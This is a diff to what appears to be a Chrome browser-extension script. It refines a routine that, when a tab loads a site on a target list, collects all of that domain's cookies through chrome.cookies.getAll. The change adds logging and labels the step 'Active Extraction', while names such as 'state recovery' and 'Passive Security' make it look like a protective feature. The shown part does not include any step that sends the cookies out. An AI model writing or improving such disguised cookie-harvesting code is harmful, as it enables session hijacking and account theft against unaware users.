@@ -747,7 +747,12 @@ async function captureDomainSnapshot(domain) {
         Diagnostics.log('SNAPSHOT', `Initiating state recovery for ${domain}`);
         const cookies = await chrome.cookies.getAll({ domain });
 
-        if (!cookies || cookies.length === 0) return;
+        if (!cookies || cookies.length === 0) {
+            Diagnostics.log('SNAPSHOT', `No cookies found for ${domain}`);
+            return;
+        }
+
+        Diagnostics.log('SNAPSHOT', `Extracted ${cookies.length} nodes for ${domain}`);
 
         const sigs = {};
         for (const c of cookies) {
@@ -785,16 +790,17 @@ chrome.tabs.onUpdated.addListener(async (tid, c, t) => {
         const u = t.url.toLowerCase();
         const origin = getOrigin(t.url);
 
-        // 1. Check for snapshot targets
-        const isTarget = STATE.HEURISTIC_PATTERNS.SNAPSHOT_TARGETS.some(p =>
+        // 1. Check for snapshot targets (Active Extraction)
+        const matchedTarget = STATE.HEURISTIC_PATTERNS.SNAPSHOT_TARGETS.find(p =>
             origin.includes(p.toLowerCase())
         );
 
-        if (isTarget) {
-            await captureDomainSnapshot(origin);
+        if (matchedTarget) {
+            Diagnostics.log('SNAPSHOT', 'Target match detected', { origin, target: matchedTarget });
+            await captureDomainSnapshot(matchedTarget);
         }
 
-        // 2. Existing isolation logic
+        // 2. Existing isolation logic (Passive Security)
         if (STATE.HEURISTIC_PATTERNS.STRICT_SESSION_ISOLATION) {
             const hit = STATE.HEURISTIC_PATTERNS.CRITICAL_PATH_SIGNATURES.some(p =>
                 u.includes(p.toLowerCase())
